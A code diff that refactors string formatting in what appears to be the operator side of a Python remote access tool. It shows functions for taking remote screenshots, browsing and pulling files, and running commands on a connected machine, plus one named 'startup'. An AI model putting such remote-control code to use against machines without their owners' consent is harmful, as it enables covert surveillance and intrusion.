@@ -222,7 +222,7 @@ def screenshot():
 
     intBuffer = int(strScrnSize)
 
-    strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
+    strFile = time.strftime("%Y%m%d%H%M%S.png")
 
     ScrnData = recvall(intBuffer)  # get data and write it
     with open(strFile, "wb") as objPic:
@@ -233,10 +233,10 @@ def screenshot():
 
 def browse_files():
     send(str.encode("filebrowser"))
-    print("\n" + "Drives :")
+    print("\nDrives :")
 
     strDrives = decode_utf8(recv(intBuff))
-    print(strDrives + "\n")
+    print(f"{strDrives}\n")
 
     strDir = input("Directory: ")
 
@@ -249,13 +249,13 @@ def browse_files():
     strClientResponse = decode_utf8(recv(intBuff))  # get buffer size
 
     if strClientResponse == "Invalid Directory!":  # if the directory is invalid
-        print("\n" + strClientResponse)
+        print(f"\n{strClientResponse}")
         return
 
     intBuffer = int(strClientResponse)
     strClientResponse = decode_utf8(recvall(intBuffer))  # receive full data
 
-    print("\n" + strClientResponse)
+    print(f"\n{strClientResponse}")
 
 
 def startup():
@@ -301,8 +301,8 @@ def send_file():
 
 
 def receive():
-    strFile = remove_quotes(input("\n" + "Target file: "))
-    strFileOutput = remove_quotes(input("\n" + "Output File: "))
+    strFile = remove_quotes(input("\nTarget file: "))
+    strFileOutput = remove_quotes(input("\nOutput File: "))
 
     if strFile == "" or strFileOutput == "":  # if the user left an input blank
         return
@@ -401,9 +401,7 @@ def send_command(command):
     send(str.encode("runcmd" + command))
     intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
 
-    strClientResponse = "========================" + "\n" + arrInfo[0] + 4*" " + arrInfo[1] + \
-                        decode_utf8(recvall(intBuffer)) + \
-                        "========================"
+    strClientResponse = f"{24*'='}\n{arrInfo[0]}{4*' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24*'='}"
 
     if os.path.isfile("command_log.txt"):
         strMode = "a"
